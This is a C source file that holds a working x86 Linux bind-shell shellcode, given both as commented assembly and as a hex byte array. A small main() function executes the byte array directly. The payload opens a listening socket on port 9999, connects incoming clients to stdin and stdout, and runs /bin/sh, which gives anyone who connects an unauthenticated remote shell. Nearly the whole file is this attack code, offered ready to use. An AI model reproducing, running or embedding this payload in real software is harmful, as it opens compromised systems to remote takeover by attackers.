/*
.file	"bind"
.version	"01.01"
.text
	.align 4
.globl main
	.type	 main,@function
_start:
	#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
	movl %esp,%ebp
	xorl %edx,%edx
	movb $102,%edx
	movl %edx,%eax		# 102 = socketcall
	xorl %ecx,%ecx
	movl %ecx,%ebx
	incl %ebx	 	# socket()
	movl %ebx, -8(%ebp)	# 1 = SOCK_STREAM
	incl %ebx
	movl %ebx, -12(%ebp)	# 2 = AF_INET
	decl %ebx		# 1 = SYS_socket
	movl %ecx, -4(%ebp)	# 0 = IPPROTO_IP 
	leal -12(%ebp),%ecx	# put args in correct place
	int  $0x80		# switch to kernel-mode
	xorl %ecx,%ecx
	movl %eax,-12(%ebp)	# save the fd

	# bind(fd,(struct sockaddr *)&struct,16);
	incl %ebx
	movw %ebx,-20(%ebp)	# 2 = AF_INET & 2 = SYS_bind
	movw $9999,-18(%ebp)	# 9999 = htons(3879)
	movl %ecx,-16(%ebp)	# 0 = INADDR_ANY
	leal -20(%ebp),%eax	# struct sockaddr
	movl %eax,-8(%ebp)	# load the struct
	movb $16,-4(%ebp)	# 16 = sizeof(struct sockaddr)
	movl %edx,%eax		# 102 = socketcall
	leal -12(%ebp),%ecx	# puts args in correct place
	int $0x80

	# listen(fd,something);
	# fd is at -12(%ebp) = %ecx
	movl %edx,%eax		# 102 = socketcall
	incl %ebx		# 2 * incl < addl
	incl %ebx		# 4 = SYS_listen 
	int  $0x80		

	# accept(fd,struct sockaddr,16);
	# struct sockaddr is at -8(%ebp)	
	movl %edx,%eax		# if you don't know by now, that a gun and shoot yourself
	incl %ebx		# 5 = SYS_accept
	# %ecx = -12(%ebp) 
	int  $0x80
	movl %eax,%ebx		# save new fd

	# dup2(fd,0)
	xorl %ecx,%ecx
	movb $63,%edx		# 63 = dup2()
	movl %edx,%eax
	int  $0x80

	#dup2(fd,1)
	movl %edx,%eax
	incl %ecx
	int  $0x80

	# arg[0] = "/bin/sh"
	# arg[1] = 0x0
	# execve(arg[0],arg);
	jmp  0x18
	popl %esi
	movl %esi,0x8(%ebp)
	xorl %eax,%eax
	movb %eax,0x7(%esi)
	movl %eax,0xc(%ebp)
	movb $0xb,%al
	movl %esi,%ebx
	leal 0x8(%ebp),%ecx	
	leal 0xc(%ebp),%edx	
	int  $0x80	
	call -0x1d
	.string "/bin/sh"
*/
#define CODESIZE 129
/* Optimized the code, now it works better in bad situations */
#define NAME "portbinding"
char code[]=
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";
main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(code));
  (int)(*funct)();
}
